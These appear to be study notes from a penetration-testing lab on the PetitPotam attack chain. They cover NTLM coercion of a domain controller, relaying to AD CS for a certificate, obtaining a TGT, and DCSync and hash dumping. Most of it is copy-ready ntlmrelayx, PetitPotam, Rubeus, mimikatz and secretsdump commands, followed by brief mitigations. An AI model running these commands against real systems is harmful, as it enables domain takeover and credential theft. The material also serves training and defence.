LSA spoofing vulnerability
- coerce DC to authenticate another host using NTLM over port 445 by abusing Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC)
    
    - Local Security Authority Remote Protocol (LSARPC)
    
- allows unauthenticated attackers to take over Windows domain where AD CS is in use
- authentication request sent to DC is relayed to CA host’s Web Enrollment pag and makes a Certificate Signing Request (CSR) for a new digital cert
    
    - new cert can be used with Rubeus or [gettgtpkinit.py](http://gettgtpkinit.py) to request a TGT for the Domain Controller → DC Sync
    
  
set up ntlmrelayx
- if you don’t know where the AD CS is, you can use certi to attempt to locate it
```JavaScript
ntlmrelayx.py -debug -smb2support --target http://<ADCS_name>.<DOMAIN>/certsrv/certfnsh.asp --adcs --template DomainController
```
![[../../assets/PetitPotam (MS-EFSRPC)/image 368.png|image 368.png]]
  
run [petitpotam.py](http://petitpotam.py) to attempt to coerce the DC to authenticate our host where ntlmrelayx is running
- can use mimikatz with “misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>”
- can also use PowerShell implementation “Invoke-PetitPotam.ps1”
```JavaScript
python3 PetitPotam.py <attacker_IP> <IP>
```
![[../../assets/PetitPotam (MS-EFSRPC)/image 1 276.png|image 1 276.png]]
  
catch the base64 encoded certificate with ntlmrelayx
- no comand to run here, just have ntlmrelayx running
![[../../assets/PetitPotam (MS-EFSRPC)/image 2 235.png|image 2 235.png]]
  
once we have the certificate, there are several paths we can take (denoted by different headers)
## Use DC TGT to DC Sync
request TGT using gettgtpkinit.py
```JavaScript
python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_name>\$ -pfx-base64 <base64_cert> dc.ccache
```
![[../../assets/PetitPotam (MS-EFSRPC)/image 3 203.png|image 3 203.png]]
  
set up KRB5CCNAME env variable
```JavaScript
export KRB5CCNAME=dc.ccache
```
  
- or just use secretsdump (below)
```JavaScript
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "<DC_name>$"@<DC_name>.<DOMAIN>
```
![[../../assets/PetitPotam (MS-EFSRPC)/image 4 178.png|image 4 178.png]]
  
secretsdump
```JavaScript
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass <DC_name>.<DOMAIN>
```
  
## Submitting TGS request to Get NTLM Hash
Get the Kerberos key by using PKINITtools (used in example above)
can also submit a TGS request for ourselves using getnthash.py
```JavaScript
python /opt/PKINITtools/getnthash.py -key <key> <DOMAIN>/<DC_name>$
```
![[../../assets/PetitPotam (MS-EFSRPC)/image 5 166.png|image 5 166.png]]
  
secretsdump with NTLM hash
```JavaScript
secretsdump.py -just-dc-user <DOMAIN>/administrator "<DC_name>$"@<DC_IP> -hashes aad3c435b514a4eeaad3b935b51304fe:<NT_hash>
```
## Requesting TGT and Performing PTT with DC Machine Account
once we get the base64 certificate, we can just use that to submit a request for TGT and perform pass-the-ticket (PTT) all at once
```JavaScript
.\Rubeus.exe asktgt /user:<DC_name>$$ /certificate:<base64_cert> /ptt
```
![[../../assets/PetitPotam (MS-EFSRPC)/image 6 143.png|image 6 143.png]]
  
confirm ticket is in memory using klist
![[../../assets/PetitPotam (MS-EFSRPC)/image 7 134.png|image 7 134.png]]
  
use mimikatz to dump hashes
```JavaScript
lsadump::dcsync /user:<DOMAIN>\krbtgt
```
- in their example, they just use “inlanefreight”, not “inlanefreight.local”
![[../../assets/PetitPotam (MS-EFSRPC)/image 8 117.png|image 8 117.png]]
  
# Mitigations
- patch from CVE-2021-36942
- prevent NTLM relay attacks
    
    - use Extended Protection for Authentication along with Require SSL
        
        - allows only HTTPS connections for CA Web Enrollment
        
    
- Disabling NTLM authentication
- Disabling NTLM on AD CS server using Group Policy
- Disabling NTLM for IIS on AD CS servers where Web Enrollment and Certificate Enrollment Web Service is in use